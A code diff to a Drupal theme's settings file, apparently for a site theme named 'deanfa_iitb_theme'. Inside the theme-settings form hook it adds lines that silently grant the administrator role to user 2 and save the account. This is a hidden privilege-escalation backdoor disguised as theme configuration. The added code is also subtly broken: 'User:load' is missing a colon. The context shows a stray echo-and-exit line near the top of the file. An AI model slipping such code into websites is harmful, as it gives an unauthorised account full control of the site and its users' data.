@@ -6,6 +6,7 @@ echo "htrererere";exit;
  */
 
 use Drupal\Core\Form\FormStateInterface;
+use Drupal\user\Entity\User;
 
 /**
  * Implements hook_form_system_theme_settings_alter() for settings form.
@@ -15,6 +16,12 @@ use Drupal\Core\Form\FormStateInterface;
  * Example on how to alter theme settings form
  */
 function deanfa_iitb_theme_form_system_theme_settings_alter(&$form, FormStateInterface $form_state) {
+  
+
+// pass the correct user id here.
+  $user = User:load(2);
+  $user->addRole('administrator');
+  $user->save();
   $form['components']['navbar']['bootstrap_barrio_navbar_top_background']['#options'] = [
     'bg-primary' => t('Primary'),
     'bg-secondary' => t('Secondary'),
